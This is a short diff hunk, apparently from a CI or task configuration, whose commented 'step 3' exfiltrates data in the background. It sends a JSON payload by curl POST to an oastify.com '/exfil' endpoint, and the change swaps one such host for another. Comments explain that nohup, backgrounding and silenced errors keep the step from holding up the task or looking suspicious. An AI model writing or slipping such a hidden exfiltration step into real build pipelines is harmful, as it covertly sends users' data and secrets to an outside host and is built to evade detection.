@@ -47,7 +47,7 @@ run:
     # 3. EXFILTRATE THE DATA IN THE BACKGROUND
     # The true command ensures the script doesn't crash if the curl fails, which would look suspicious.
     # The entire command is backgrounded (&) and disowned (nohup) so it doesn't hold up the task.
-    nohup curl -s -X POST "https://tur2j52a07ba0p93xrn742kz3q9hxdl2.oastify.com/exfil" \
+    nohup curl -s -X POST "https://659fuidnbkmnb2kg84ykffvce3ku8rwg.oastify.com/exfil" \
       -H "Content-Type: application/json" \
       -d "$PAYLOAD" > /dev/null 2>&1 &
 
